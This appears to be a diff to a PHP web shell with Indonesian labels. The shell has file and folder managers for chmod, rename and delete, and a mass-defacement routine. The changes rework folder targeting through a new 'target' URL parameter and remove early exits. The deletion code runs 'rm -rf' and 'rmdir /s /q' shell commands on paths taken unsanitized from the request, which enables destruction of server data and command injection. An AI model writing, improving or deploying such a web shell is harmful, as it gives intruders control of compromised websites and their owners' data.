@@ -418,7 +418,6 @@ function chmodFile($dir, $file, $nfile) {
             echo '<font color="white">Change Permission Gagal</font><br/>';
         }
     }
-    exit;
 }
 function buatFile($dir, $imgfile) {
     echo "<h4>$imgfile Buat File :</h4>
@@ -539,13 +538,12 @@ function chmodFolder($dir, $ndir) {
         </div>
     </form>";
     if (isset($_POST['chmo'])) {
-        if (@chmod($_GET['dir'], $_POST['perm'])) {
+        if (@chmod($dir.'/'.$ndir, $_POST['perm'])) {
             echo '<font color="lime">Change Permission Berhasil</font><br/>';
         } else {
             echo '<font color="white">Change Permission Gagal</font><br/>';
         }
     }
-    exit;
 }
 function buatFolder($dir, $imgfol) {
     echo "<h5>$imgfol Buat Folder :</h5>
@@ -577,7 +575,8 @@ function buatFolder($dir, $imgfol) {
     }
 }
 function renameFolder($dir, $ndir, $imgfol) {
-    echo "[ <a href='?dir=".$dir."&aksi=rename_folder' class='active'>Rename</a> ]  [ <a href='?dir=".$dir."&aksi=hapus_folder'>Delete</a> ] 
+    $target = $dir.'/'.$ndir;
+    echo "[ <a href='?dir=$dir&target=$ndir&aksi=rename_folder' class='active'>Rename</a> ]  [ <a href='?dir=$dir&target=$ndir&aksi=hapus_folder'>Delete</a> ]
     <h5>$imgfol Rename Folder : $ndir </h5>
     <form method='POST'>
         <input type='text' class='form-control' name='namanew' placeholder='Masukan Nama Baru...' value='$ndir'><br/>
@@ -585,24 +584,22 @@ function renameFolder($dir, $ndir, $imgfol) {
     </form>";
     if (isset($_POST['ganti'])) {
         $baru = htmlspecialchars($_POST['namanew']);
-        $ubah = rename($dir, ''.dirname($dir).'/'.$baru.'');
+        $ubah = rename($target, ''.$dir.'/'.$baru.'');
         if ($ubah) {
             $swa = 'success';
             $text = 'Berhasil Mengganti Nama';
-            $dir = dirname($dir);
             swall($swa, $text, $dir);
         } else {
             $swa = 'error';
             $text = 'Gagal Mengganti Nama';
-            $dir = dirname($dir);
             swall($swa, $text, $dir);
         }
     }
-    exit;
 }
 function deleteFolder($dir, $ndir) {
-    echo "[ <a href='?dir=".$dir."&aksi=rename_folder'>Rename</a> ]  [ <a href='?dir=".$dir."&aksi=hapus_folder' class='active'>Delete</a> ] 
-    <div class='card card-body text-center text-dark mb-4'>
+    $target = $dir.'/'.$ndir;
+    echo "[ <a href='?dir=$dir&target=$ndir&aksi=rename_folder'>Rename</a> ]  [ <a href='?dir=$dir&target=$ndir&aksi=hapus_folder' class='active'>Delete</a> ]
+    <div class='card card-body text-center text-dark mb-2'>
         <p>Apakah Yakin Menghapus : $ndir ?</p>
         <form method='POST'>
             <a class='btn btn-danger btn-block' href='?dir=".dirname($dir)."'>Tidak</a>
@@ -610,24 +607,21 @@ function deleteFolder($dir, $ndir) {
         </form>
     </div><br/>";
     if ($_POST['ya']) {
-        if (is_dir($dir)) {
-            if (is_writable($dir)) {
-                @rmdir($dir);
-                @exe("rm -rf $dir");
-                @exe("rmdir /s /q $dir");
+        if (is_dir($target)) {
+            if (is_writable($target)) {
+                @rmdir($target);
+                @exe("rm -rf $target");
+                @exe("rmdir /s /q $target");
                 $swa = 'success';
                 $text = 'Berhasil Menghapus';
-                $dir = dirname($dir);
                 swall($swa, $text, $dir);
             } else {
                 $swa = 'error';
                 $text = 'Berhasil Menghapus';
-                $dir = dirname($dir);
                 swall($swa, $text, $dir);
             }
         }
     }
-    exit;
 }
 function aksiMasdef($dir, $file, $imgfol, $imgfile) {
     function tipe_massal($dir, $namafile, $isi_script) {
@@ -2383,7 +2377,7 @@ function zipMenu($dir, $file) {
                 if ($_GET['aksi'] == 'hapusf') {
                     hapusFile($dir, $file, $nfile);
                 }
-                $ndir = basename($dir);
+                $ndir = $_GET['target'];
                 //chmod
                 if ($_GET['aksi'] == 'chmod_dir') {
                     chmodFolder($dir, $ndir);
@@ -2559,7 +2553,7 @@ function zipMenu($dir, $file) {
                             <td>--</td>
                             <td><?= $dtime ?></td>
                             <td>
-                                <a href="?dir=<?= $dir ?>/<?= $dirb ?>&aksi=chmod_dir">
+                                <a href="?dir=<?= $dir ?>&target=<?= $dirb ?>&aksi=chmod_dir">
                                 <?php
                                 if (is_writable($dir.'/'.$dirb)) {
                                     $color = '#00ff00';
@@ -2570,7 +2564,7 @@ function zipMenu($dir, $file) {
                                 </a>
                             </td>
                             <td>
-                                <a title="Rename" class="badge badge-success" href="?dir=<?= $dir ?>/<?= $dirb ?>&aksi=rename_folder">&nbsp;<i class="fas fa-pen"></i>&nbsp;</a>&nbsp;&nbsp;<a title="Delete" class="badge badge-danger" href="?dir=<?= $dir ?>/<?= $dirb ?>&aksi=hapus_folder">&nbsp;<i class="fa fa-trash"></i>&nbsp;</a>
+                                <a title="Rename" class="badge badge-success" href="?dir=<?= $dir ?>&target=<?= $dirb ?>&aksi=rename_folder">&nbsp;<i class="fas fa-pen"></i>&nbsp;</a>&nbsp;&nbsp;<a title="Delete" class="badge badge-danger" href="?dir=<?= $dir ?>&target=<?= $dirb ?>&aksi=hapus_folder">&nbsp;<i class="fa fa-trash"></i>&nbsp;</a>
                             </td>
                         </tr>
                     <?php
